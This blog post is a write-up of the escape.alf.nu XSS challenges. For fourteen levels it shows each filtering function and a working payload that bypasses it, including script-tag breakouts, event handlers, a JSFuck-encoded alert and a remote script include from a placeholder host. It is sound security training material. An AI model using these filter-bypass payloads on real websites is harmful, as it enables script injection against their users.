---
author: AnirudhAnand
layout: post
title: escape.alf.nu - XSS Challenges writeup
categories:
- webchallenges
- xss
keywords: XSS, webhacking
summary: If you haven't seen this already, this is a series of <a href="http://escape.alf.nu">XSS challenges</a> by <a href="https://twitter.com/steike">Erling Ellingsen</a>. The challenges were really good and if you haven't attempted to solve it, you should definitely try yourself before reading the writeups here.
---

There are 15 challenges overall. So lets discuss the writeups one by one.

#### Level 0:

{% highlight javascript lineos %}

function escape(s) {
  // Warmup.

  return '<script>console.log("'+s+'");</script>';
}

{% endhighlight %}

Well, this is very easy. There is no regex check, nor any filters so its very easy. Lets close the `console.log()` function first and then add our little `alert(1)` and balancing the quote afterwards.

Payload: `“);alert(1)(“`


#### Level 1:

{% highlight javascript lineos %}

function escape(s) {
  // Escaping scheme courtesy of Adobe Systems, Inc.
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}

{% endhighlight %}

A small change from the above question where `" (quotes)` are filtered globally (see the /g in regex check) with a backslash. So the best way to bypass this is that we will give a backslash and then the quotes (which together renders like `\\"` ) so both the backslashes will cancel each other and we can execute alert(1).

Payload: `\");alert(1)//`



#### Level 2:

{% highlight javascript lineos %}

function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}

{% endhighlight %}

If you read/play with `JSON.stringify()` more, you can see that it will escape double quotes. So we cannot inject it but an interesting thing is, it will not escape angle brackets. So the easiest way is close the script tag already opened and then start a new one with alert(1).

Payload: `</script><script>alert(1)//`



#### Level 3:

{% highlight javascript lineos %}

function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}

{% endhighlight %}

One quick thing you can notice with this challenge is that its on URL context. So the best way to bypass filters is to try URL encoding. Since double quotes (") is filtered, we can bypass it by URL encoding the double quotes which is nothing but `%22`.

Payload: `%22);alert(1)//`


#### Level 4:

{% highlight javascript lineos %}

function escape(s) {
  var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}

{% endhighlight %}

One quick thing to note here is that the developer has actually forgotten to globally remove double quotes (only the first instance is removed). We can make use of this. Also we can try exploiting the image alt features by creating an expected output by the REgex along with an event handler which triggers the XSS.

Payload: `[[a|""onload="alert(1)]]`

#### Level 5:

{% highlight javascript lineos %}

function escape(s) {
  // Level 4 had a typo, thanks Alok.
  // If your solution for 4 still works here, you can go back and get more points on level 4 now.

  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}

{% endhighlight %}

Well, things got interesting here as there is no way we can inject double quote here. So we need to make use of both img and href tag together in a way, one closes the other context and we can inject an event handler.

```
[[a|a]]            ->        <img alt="a" src="a.gif">

[[a|b]]            ->        <img alt="b" src="a.gif">
```

ok, this means we can control what ever comes inside the `alt` tag. Lets see what happens if we inject `http://` there.

```
[[a|http://]]      ->        <img alt="<a href="http://" src="a.gif">">http://]]</a>
```

Now that looks cool. So now you can see that the `alt` context is escaped with the double quotes that comes with href which means we can try injecting our own event handler (since double quotes are filtered, we might want to try single quotes).

Payload: `[[a|http://onload='alert(1)']]`


#### Level 6:

{% highlight javascript lineos %}

function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}

{% endhighlight %}


This is one easy level where I got stuck for a long time. I used the browser console to try out so many functions that starts with "create" but it was too difficult to find out one which doesnot filter any characters. After so much of time, I looked into comments which is when I realized, this is so easy.

```
Comment#lol      ->      <!--lol-->
```
Well, lets close the comment and then inject our string.

Payload: `Comment#--><script>alert(1)</script>`

#### Level 7:

{% highlight javascript lineos %}

function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']\*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}

{% endhighlight %}

An important thing to note here is that `callback` can contain single quotes `'` which can be of big help. Also we are already in the script context so the easiest thing to do is to put the entire thing inside single quotes so that it converts to a string and then inject our payload.

Payload: `'#';alert(1)//`

#### Level 8:

{% highlight javascript lineos %}

function escape(s) {
  // Courtesy of Skandiabanken
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}

{% endhighlight %}

Well, the first thing came to my mind is to use JSFuck as it can easily bypass the uppercase filter but its length is too high. Another best way to do it is to close the existing `script` tag and reopen a new one with an `src` attribute.

Payload: `</script><script src="site.com/1.js">`

#### Level 9:

{% highlight javascript lineos %}

function escape(s) {
  // This is sort of a spoiler for the last level :-)

  if (/[\\<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}

{% endhighlight %}

Since angle brackets are closed here, there is no other way than to use [JSFuck](www.jsfuck.com) (non-alphanumeric javascript).

Payload: `"+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])())//`

I am not sure of any other ways to solve this. If you know a shorted method, please do comment on this post and let us discuss (I have seen some but was a bit difficult to understand) :)


#### Level 10:

{% highlight javascript lineos %}

function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g,
        function(_, n) {
           return htmlEscape(args[n]);
         });
  }

  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
{% endhighlight %}

This one comes inside the script context with quotes and angle brackets filtered. But one thing to note here is that the backslash is not escaped. So the easiest way here is to hex encode.

Payload: `\u003cimg src=a onerror=alert(1)\u003e`

#### Level 11:

{% highlight javascript lineos %}

function escape(s) {
  // Spoiler for level 2
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}

{% endhighlight %}

This one is easy as the filter they use is most common one that we can see around. After the injection, we need the word `script`.

Payload: `</</scriptscript><script>alert(1)//`

#### Level 12:

{% highlight javascript lineos %}

function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/);

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}

{% endhighlight %}

This is quite similar to the one we saw before but with an exception that this time backslashes are escaped making it difficult for us to comment the rest of the string. Well, just use `<!--` :P

Payload: `'#';alert(1)<!--`


#### Level 13:

{% highlight javascript lineos %}

function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // http://print.alf.nu/?html=... just outputs whatever you pass in.
  //
  // Alerting from print.alf.nu won't count; try to trigger the one below.

  s = '<script>' + s + '<\/script>';
  tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.onload = function() {
    if (youWon) alert(1);
  };
  document.body.appendChild(tag);
}

{% endhighlight %}

I took quite sometime to understand this challenge but its almost clear for me (I had to read some writeups already written to understand this). The main point to understand here is that

> if an iframe defines its window.name to `youWon`, then the new name will be injected in the parent's global window object which inturn sets the `youWon` variable and it leads to the call of `alert(1)`.

You can also see that what ever we give as input to print.alf.nu, it gets reflected back in the response which makes our tasks easier !

Payload: `name='youWon'`

I still haven't properly understood the last 2 levels of these challenges. I will update the page once I clearly understand how it can be solved. Thanks for the read and let me know if there are any comments !
